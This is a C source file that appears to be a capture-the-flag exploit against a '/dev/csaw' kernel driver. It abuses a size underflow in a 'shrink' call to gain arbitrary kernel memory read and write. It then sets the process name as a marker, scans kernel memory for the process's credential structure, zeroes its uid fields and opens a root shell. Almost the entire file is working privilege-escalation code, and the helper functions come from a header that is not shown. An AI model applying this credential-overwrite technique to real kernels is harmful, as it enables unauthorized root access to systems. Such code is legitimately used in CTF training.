#include <stdio.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include "exp.h"


// int alloc(struct file* fd, size_t size){
// void open(struct file*fd, int id){
// void grow(struct file*fd, int id, size_t size){
// void shrink(struct file* fd, int id, size_t size){
// void read(struct file*fd, int id, void *buf, size_t count){
// void write(struct file*fd, int id, void *buf, size_t count){
// void seek(struct file*fd, int id, off_t index, int whence){
// void close(struct file*fd, int id){

void main() {

    char target[0x10];
    strcpy(target, "find_me!");
    prctl(PR_SET_NAME, target);

    fd  = open("/dev/csaw", O_RDWR);
    id = c_alloc(fd, 0x20);
    c_shrink(fd, id, 0x21);

    void *buf = malloc(0x1000);
    uint64 cred = 0;

    for (uint64 address = 0xffff880000000000; address < 0xffffc80000000000; address +=0x1000){
        memset(buf, 0, 0x1000);
        reada(address, buf, 0x1000);
        void* result = memmem(buf, 0x1000, target, 0x8);
        if (result){

            cred = *(uint64 *)(result - 0x8);
            uint64 real_cred = *(uint64 *)(result - 0x10);

             if ((cred & 0xffff000000000000) && (real_cred == cred)) {
                 printf("find cred [0x%llx]\n", cred);
                 break;
             }
        }
    }

    char zero[0x20];
    memset(zero, 0, 0x20);
    writea(cred+4, zero, 0x20);

    if (getuid() == 0){
        puts("IamHere");
        system("/bin/sh");
    }else {
        printf("no!");
    }

}
